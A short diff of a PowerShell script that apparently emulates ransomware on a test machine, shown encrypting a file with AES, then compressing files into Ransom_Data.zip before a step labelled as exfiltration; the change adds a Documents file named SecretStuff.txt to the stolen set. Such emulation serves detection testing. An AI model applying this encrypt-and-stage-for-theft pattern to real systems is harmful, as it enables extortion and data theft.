@@ -706,7 +706,7 @@ Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Rans
 Start-Sleep -S 15
 
 Write-Host "[+] Preparing Files" -ForegroundColor Green
-$files = "C:\Users\Elastic\Desktop\Ransom.lnk", "C:\Users\Elastic\Desktop\Ransom1.lnk", "C:\Users\Elastic\Desktop\Ransom2.lnk", "C:\Users\Elastic\Desktop\Ransom3.lnk", "C:\Users\Elastic\Desktop\Ransom4.lnk", "C:\Users\Elastic\Desktop\Ransom6.lnk", "C:\Users\Elastic\Desktop\Ransom7.lnk", "C:\Users\Elastic\Desktop\Ransom8.lnk", "C:\Users\Elastic\Desktop\Ransom9.lnk"
+$files = "C:\Users\Elastic\Desktop\Ransom.lnk", "C:\Users\Elastic\Desktop\Ransom1.lnk", "C:\Users\Elastic\Desktop\Ransom2.lnk", "C:\Users\Elastic\Desktop\Ransom3.lnk", "C:\Users\Elastic\Desktop\Ransom4.lnk", "C:\Users\Elastic\Desktop\Ransom6.lnk", "C:\Users\Elastic\Desktop\Ransom7.lnk", "C:\Users\Elastic\Desktop\Ransom8.lnk", "C:\Users\Elastic\Desktop\Ransom9.lnk", "C:\Users\Elastic\Documents\SecretStuff.txt"
 Compress-Archive -LiteralPath $files -DestinationPath C:\temp\Ransom_Data.zip
 
 Write-Host "[+] Exfiltrating Data" -ForegroundColor Green
